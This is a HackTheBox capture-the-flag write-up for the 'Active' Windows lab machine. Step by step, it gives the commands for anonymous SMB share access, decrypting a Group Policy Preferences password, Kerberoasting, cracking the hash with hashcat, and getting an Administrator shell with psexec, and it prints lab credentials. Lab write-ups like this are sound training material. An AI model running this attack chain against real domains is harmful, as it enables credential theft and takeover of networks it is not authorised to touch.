---
layout: post
title: Active writeup.
subtitle: From HackTheBox CTF platform.
cover-img: /assets/img/active.png
thumbnail-img: /assets/img/active.png
share-img: /assets/img/active.jpg
tags: [hackthebox, ctf, meduim, windows, active directory, kerberoasting, ]
---

# Active 

![hackthebox active](/content/assets/img/active.png)

## Nmap
first  I started with nmap 

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 12:29 CDT
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

A lot of ports open but I can see kerberos,ldap and active directory so I started by enumerating ldap using `ldapsearch` 

```bash
ldapsearch -x -h 10.10.10.100 -b “DC=active,DC=htb”
```
I didn't get any useful info. 

I tried nmap script also. No info. 

then I did enum4linux 

`enum4linux 10.10.10.100`

no usefull info except for listing smb shares: 

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

I tried smbmap but didn't work ( authorization ) 

Also, I tried this but nothing worked: 

```
   16  nmblookup -A 10.10.10.100
   17  ping 10.10.10.100
   18  nmblookup 10.10.10.100
   19  smbmap -H 10.10.10.100
   20  smbclient -U "" -no-pass -L 10.10.10.100 
   21  enum4linux 10.10.10.100
   18  rpcclient -U "" -N 10.10.10.100
```

Additionally:

```
Host script results:
|_clock-skew: 12h13m21s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
```
So no relay attacks will work because Message signing is enabled and required. 

After trying smbclient I managed to connect anonymously to the directory `Replication` using:
```bash
smbclient //10.10.10.100/Replication 
```
It is a copy of the SYSVOL ( read about it here: https://adsecurity.org/?p=2288 )

After enumerating the folders and getting the files, I found an xml file that contains: 


```bash
the user: svc_tgs 
password: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 
 Its AES and we are going to decrypt it using gpp-decrypt 
 gpp-decrypt ‘AESpassword’

```

Got the password: `GPPstillStandingStrong2k18`

I managed to connect using smbclient using the credentials. 

I got the flag from Desktop

Now I decided t to enumerate ldap users so I used:

```bash
ldapsearch -x -h 10.10.10.100 -D "svc_tgs" -W 'GPPstillStandingStrong2k18' -p 389 -b "CN=SVC_TGS,CN=Users,DC=active,DC=htb" -s sub "(&(objectclass=person)(objectclass=user))"  I got tons of info
```

Then I used GetADusers.py 

```bash
GetADUsers.py -dc-ip active.hbt/svc_tgs:GPPstillStandingStrong2k18
```
## root

back to nmap we need to do kerbroasting:

Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated
with a particular service instance. ldapsearch can be used to identify accounts that are
configured with SPNs.

So we will use `GetUsersSPN.py` 

`GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request`

After we get the hash, we crack it using hashcat: 

```bash
hashcat -m 13100 hashtocrack.txt /home/qunix/bugbounty/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt --force
```

we get the `Administrator` password: `Ticketmaster1968`​

Now to get the shell I tried using psexec. 

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
```